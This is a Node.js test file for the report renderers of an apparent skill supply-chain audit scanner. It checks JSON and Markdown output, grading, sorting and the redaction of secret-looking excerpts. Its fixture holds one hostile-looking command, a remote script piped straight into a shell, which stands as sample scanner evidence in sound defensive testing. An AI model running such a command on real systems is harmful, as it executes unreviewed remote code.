// Tests for the JSON and Markdown report renderers.

'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');

const { toJson, toMarkdown } = require('../src/report.js');
const { createFinding, summarize } = require('../src/findings.js');

function finding(overrides = {}) {
  return createFinding({
    ruleId: 'SHELL-001',
    category: 'shell',
    severity: 'critical',
    packageName: 'demo',
    file: 'SKILL.md',
    line: 4,
    column: 1,
    excerpt: 'curl https://example.com/i.sh | sh',
    message: 'Remote script is piped directly into a shell interpreter',
    remediation: 'Download, verify, review, then run.',
    ...overrides,
  });
}

test('toJson returns stable, pretty-printed JSON with a summary', () => {
  const findings = [finding()];
  const summary = summarize(findings);
  const output = toJson(findings, summary);

  assert.ok(output.includes('\n  "summary"'), 'expected 2-space indentation');
  const parsed = JSON.parse(output);
  assert.equal(parsed.summary.total, 1);
  // One critical finding scores 20, which is band B (20-34). The same band holds for the
  // 32-point summary in findings.test.js, so the grade scale stays monotone.
  assert.equal(parsed.summary.grade, 'B');
  assert.equal(parsed.findings.length, 1);
  assert.equal(parsed.findings[0].ruleId, 'SHELL-001');
  assert.deepEqual(Object.keys(parsed.findings[0]), [
    'ruleId',
    'category',
    'severity',
    'packageName',
    'file',
    'line',
    'column',
    'excerpt',
    'message',
    'remediation',
  ]);
});

test('toJson redacts secret-looking excerpts', () => {
  const findings = [finding({ excerpt: 'key=AKIAIOSFODNN7EXAMPLE' })];
  const output = toJson(findings, summarize(findings));
  assert.ok(!output.includes('AKIAIOSFODNN7EXAMPLE'));
  assert.ok(output.includes('AKIA…MPLE'));
});

test('toMarkdown renders the severity table, findings table, breakdown and remediation', () => {
  const findings = [finding(), finding({ ruleId: 'MAN-002', category: 'manifest', severity: 'low', line: 1 })];
  const markdown = toMarkdown(findings, summarize(findings), {
    generatedAt: '2026-01-01T00:00:00.000Z',
    target: 'C:/skills',
    packages: 1,
  });

  assert.ok(markdown.includes('# Skill Supply Chain Audit'));
  assert.ok(markdown.includes('## Severity summary'));
  assert.ok(markdown.includes('| Severity | Count |'));
  assert.ok(markdown.includes('| critical | 1 |'));
  assert.ok(markdown.includes('## Findings'));
  assert.ok(markdown.includes('| Severity | Rule | Package | Location | Message |'));
  assert.ok(markdown.includes('SKILL.md:4'));
  assert.ok(markdown.includes('## Category breakdown'));
  assert.ok(markdown.includes('| shell | 1 | 0 | 0 | 0 | 0 | 1 |'));
  assert.ok(markdown.includes('## Remediation'));
  assert.ok(markdown.includes('### SHELL-001 — critical'));
  assert.ok(markdown.includes('Download, verify, review, then run.'));
  assert.ok(markdown.includes('- Target: `C:/skills`'));
});

test('toMarkdown redacts evidence excerpts', () => {
  const findings = [finding({ excerpt: 'token: AKIAIOSFODNN7EXAMPLE' })];
  const markdown = toMarkdown(findings, summarize(findings), {});
  assert.ok(!markdown.includes('AKIAIOSFODNN7EXAMPLE'));
  assert.ok(markdown.includes('AKIA…MPLE'));
});

test('toMarkdown sorts findings by severity then file then line', () => {
  const findings = [
    finding({ severity: 'low', file: 'b.md', line: 1 }),
    finding({ severity: 'critical', file: 'b.md', line: 9 }),
    finding({ severity: 'critical', file: 'a.md', line: 2 }),
  ];
  const markdown = toMarkdown(findings, summarize(findings), {});
  const order = ['a.md:2', 'b.md:9', 'b.md:1'].map((marker) => markdown.indexOf(marker));
  assert.ok(order[0] < order[1] && order[1] < order[2]);
});

test('reports handle an empty result set', () => {
  const markdown = toMarkdown([], summarize([]), {});
  assert.ok(markdown.includes('No findings.'));
  assert.ok(markdown.includes('Nothing to remediate.'));
  const parsed = JSON.parse(toJson([], summarize([])));
  assert.equal(parsed.findings.length, 0);
});
